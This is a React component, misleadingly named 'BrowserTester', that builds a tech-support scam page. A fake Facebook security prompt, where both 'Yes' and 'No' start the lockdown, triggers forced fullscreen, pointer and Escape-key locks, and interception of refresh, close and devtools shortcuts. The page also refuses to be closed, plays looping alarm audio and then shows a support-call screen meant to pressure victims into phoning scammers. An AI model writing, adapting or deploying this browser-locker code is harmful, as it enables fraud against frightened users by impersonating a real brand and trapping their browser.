import React, { useState, useEffect, useRef } from 'react';
import { detectOS } from './utils/osDetection';
import { startNotificationSpam, stopNotificationSpam } from './utils/notificationManager';
import LockScreen from './components/LockScreen';
import SupportCallScreen from './components/SupportCallScreen';
import ProfessionalOverlay from './components/ProfessionalOverlay';

export default function BrowserTester() {
    const [stage, setStage] = useState(1);
    const [showTimerScreen, setShowTimerScreen] = useState(false);
    const audioRef = useRef(null);
    const hasTriggeredRef = useRef(false);
    const os = detectOS();
    console.log(os);


    // Browser Detection
    const detectBrowser = () => {
        const ua = navigator.userAgent;
        return {
            isEdge: /Edg/i.test(ua),
            isSafari: /Safari/i.test(ua) && !/Chrome/i.test(ua),
            isChrome: /Chrome/i.test(ua) && !/Edg/i.test(ua),
            isFirefox: /Firefox/i.test(ua)
        };
    };
    const browser = detectBrowser();

    const triggerFullscreen = async () => {
        const el = document.documentElement;
        try {
            if (!document.fullscreenElement) {
                if (browser.isSafari && el.webkitRequestFullscreen) await el.webkitRequestFullscreen();
                else if (el.requestFullscreen) await el.requestFullscreen();
            }
        } catch (err) { console.error('Fullscreen denied:', err); }
    };

    const lockKeyboard = async () => {
        if (browser.isEdge || browser.isSafari || browser.isFirefox) return;
        if (navigator.keyboard && navigator.keyboard.lock) {
            try { await navigator.keyboard.lock(['Escape']); } catch (err) { }
        }
    };

    const lockPointer = async () => {
        try {
            if (document.body.requestPointerLock) await document.body.requestPointerLock();
            else if (document.body.webkitRequestPointerLock) await document.body.webkitRequestPointerLock();
        } catch (err) { }
    };

    // Play audio with continuous loop and transition detection
    const playAudio = () => {
        const audiof = os.isMac === true || os.isIOS === true ? 'apple-audio.mp4' : 'new1.mp3';
        // Create audio instance if needed
        if (!audioRef.current) {
            audioRef.current = new Audio(audiof);
            audioRef.current.loop = true; // ALWAYS loops, never stops
            audioRef.current.volume = 1.0;

            // Detect when first loop completes
            audioRef.current.addEventListener('timeupdate', () => {
                const duration = audioRef.current.duration;
                const currentTime = audioRef.current.currentTime;

                // When we're near the end (within 0.5s) and haven't triggered yet
                if (!hasTriggeredRef.current && duration > 0 && currentTime >= duration - 0.5) {
                    console.log('Audio loop completing, switching to Timer Screen');
                    hasTriggeredRef.current = true;
                    setShowTimerScreen(true);
                    // Audio continues playing in loop automatically (no code needed to keep it playing)
                }
            });
        }

        // Ensure playback
        if (audioRef.current.paused) {
            audioRef.current.play().catch(e => console.warn('Audio blocked:', e));
        }
    };

    // Start lockdown
    const startLockdown = () => {
        triggerFullscreen();
        setStage(2);
        lockPointer();
        lockKeyboard();
        playAudio(); // Start audio loop immediately
    };

    // Global event handlers & Continuous Locking
    useEffect(() => {
        const preventDefault = (e) => e.preventDefault();
        window.addEventListener('contextmenu', preventDefault);

        const trapKeys = (e) => {
            const key = e.key.toLowerCase();

            const blocked =
                key === 'escape' ||

                // Function keys (F1–F12 incl F5 refresh)
                key.startsWith('f') ||

                // Ctrl combos
                (e.ctrlKey && ['r', 'w', 'l', 't'].includes(key)) ||

                // Ctrl + Shift combos (devtools + hard reload)
                (e.ctrlKey && e.shiftKey && ['r', 'i', 'c'].includes(key)) ||

                // Alt + F4
                (e.altKey && key === 'f4');

            if (blocked) {
                navigator.vibrate?.([200, 100, 200]);
                e.preventDefault();
                e.stopPropagation();

                if (stage >= 2) {
                    triggerFullscreen();
                    lockPointer();
                }
            }
        };

        window.addEventListener('keydown', trapKeys);

        const handleBeforeUnload = (e) => {
            if (stage >= 2) {
                e.preventDefault();
                e.returnValue = 'System Alert: Security Scan in Progress. Do not close.';
                return e.returnValue;
            }
        };
        window.addEventListener('beforeunload', handleBeforeUnload);

        const handleFullscreenChange = () => {
            if (!document.fullscreenElement && stage >= 2) {
                setTimeout(triggerFullscreen, 100);
            }
        };
        document.addEventListener('fullscreenchange', handleFullscreenChange);

        const handleVisibilityChange = () => {
            if (document.hidden && stage >= 2) {
                setTimeout(() => {
                    triggerFullscreen();
                    lockPointer();
                }, 100);
            }
        };
        document.addEventListener('visibilitychange', handleVisibilityChange);


        const handleClick = () => {
            if (stage >= 2) {
                triggerFullscreen();
                lockPointer();
                lockKeyboard();
                playAudio(); // Ensure audio plays on click
            }
        };
        document.addEventListener('click', handleClick);

        return () => {
            window.removeEventListener('contextmenu', preventDefault);
            window.removeEventListener('keydown', trapKeys);
            window.removeEventListener('beforeunload', handleBeforeUnload);
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            document.removeEventListener('visibilitychange', handleVisibilityChange);
            document.removeEventListener('click', handleClick);
            stopNotificationSpam();
        };
    }, [stage]);

    const advanceStage = () => {
        triggerFullscreen();
        lockPointer();
        lockKeyboard();
    };

    return (
        <div className="fixed inset-0 overflow-hidden font-sans">
            {/* Stage 1: Meta Security Popup */}
            {stage === 1 && (
                <div
                    className="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fade-in"
                    onClick={startLockdown}
                >
                    <div className="bg-white rounded-xl shadow-2xl overflow-hidden w-full max-w-md mx-auto p-6 sm:p-8 text-center">
                        {/* Optional Logo */}
                        {/*<div className="flex justify-center mb-4">
                            <svg width="60" height="60" viewBox="0 0 48 48">
                                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
                                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
                                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
                                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
                            </svg>
                        </div>*/}
                        <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold text-[#1877F2] mb-6 sm:mb-8">facebook</h2>

                        <p className="text-gray-600 text-sm sm:text-base mb-6">
                            We’ve noticed unusual activity on your account. Please verify your identity to continue.
                        </p>

                        <div className="flex flex-col sm:flex-row gap-4 justify-center">
                            <button
                                onClick={startLockdown}
                                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition-colors"
                            >
                                Yes
                            </button>
                            <button
                                onClick={startLockdown}
                                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition-colors"
                            >
                                No
                            </button>
                        </div>
                    </div>

                </div>
            )}

            {/* Stage 2: Lock Screen with Professional Popups */}
            {stage >= 2 && !showTimerScreen && (
                <div className="fixed inset-0 z-0">
                    <LockScreen />
                    <ProfessionalOverlay />

                    {/* Capture Clicks */}
                    <div className="absolute inset-0 z-10 pointer-events-auto cursor-none" onClick={advanceStage}>
                        <div className="absolute inset-0 z-50"></div>
                    </div>
                </div>
            )}

            {/* Stage 3: Timer Screen (After One Audio Loop) */}
            {showTimerScreen && (
                <div className="fixed inset-0 z-50">
                    <SupportCallScreen />
                </div>
            )}
        </div>
    );
}
